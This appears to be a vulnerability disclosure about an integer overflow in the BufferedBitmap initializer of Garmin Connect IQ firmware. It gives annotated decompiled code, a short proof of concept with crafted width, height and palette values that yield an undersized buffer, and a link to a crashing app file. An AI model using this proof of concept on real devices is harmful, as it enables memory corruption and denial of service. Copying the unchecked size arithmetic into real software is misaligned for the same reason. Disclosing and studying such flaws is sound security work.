# Integer Overflows in `BufferedBitmap` Initialization
The `Toybox.Graphics.BufferedBitmap` object can be initialized with various parameters, including:

- width
- height
- palette
- color depth

Those values are used to compute the size of the buffer to allocate for the buffered bitmap. However, the firmware does not handle integer overflows and it is possible to specify values that will lead to a smaller-than-expected allocated buffer.

```c
s_tvm_ctx * native:Toybox.Graphics.BufferedBitmap.initialize(s_tvm_ctx *ctx)
{
// [...]
    ret = (s_tvm_ctx *)tvm_object_convert_to_int-?(ctx,&value_field,&int_field_width);
    if (ret != (s_tvm_ctx *)0x0) {
      return ret;
    }
    // Anvil: width is 4 bytes and cannot be < 0x80000000
    if (int_field_width < 0) {
      return (s_tvm_ctx *)0xa;
    }
// [...]
    ret = (s_tvm_ctx *)tvm_object_convert_to_int-?(ctx,&value_field,&int_field_height);
    if (ret != (s_tvm_ctx *)0x0) {
      return ret;
    }
    // Anvil: height is 4 bytes and cannot be < 0x80000000
    if (int_field_height < 0) {
      return (s_tvm_ctx *)0xa;
    }
// [...]
    // Anvil: bits per pixel computed based on the size of the palette
    if (length_array_palette != 0) {
      if (length_array_palette < 3) {
                    /* 2-color palette */
        bits_per_pixel = 1;
      }
      else if (length_array_palette < 5) {
                    /* 4-color palette */
        bits_per_pixel = 2;
      }
      else if (length_array_palette < 17) {
                    /* 16-color palette */
        bits_per_pixel = 4;
      }
      else if (length_array_palette < 257) {
                    /* 256-color palette */
        bits_per_pixel = 8;
      }
      else {
        ret = (s_tvm_ctx *)thunk_FUN_00179a5c(ctx,(uint *)PTR_DAT_04796dc0,PTR_s_Palette_cannot_exceed_256_colors_04796dc8);
        if (ret != (s_tvm_ctx *)0x0) {
          return ret;
        }
      }
    }
// [...]
    total_bytes_width = int_field_width * bits_per_pixel + 0x1f;
    if (total_bytes_width < 0) {
      total_bytes_width = int_field_width * bits_per_pixel + 0x3e;
    }
    total_bytes_width = (total_bytes_width >> 5 & 0x3fffU) * 4;
    // Anvil: The final size can overflow
    total_bytes = int_field_height * total_bytes_width + palette_size;
// [...]
	// Anvil: And the allocated size can be smaller than expected
    tvm_mem_alloc(ctx,total_bytes + 0x48U,0,&resource_object);
```

The following proof-of-concept will result in an incorrect `total_bytes` value:

```java
var options = {
	:width => 0x3ff0,
	:height => 0x41004010,
	:palette => [
		Graphics.COLOR_WHITE, Graphics.COLOR_BLACK, Graphics.COLOR_BLUE, Graphics.COLOR_GREEN,
	]
};
mBuffer = new Graphics.BufferedBitmap(options);
```

The following `PRG` file will crash the device: <https://github.com/anvilsecure/garmin-ciq-app-research/blob/main/poc/GRMN-04.prg>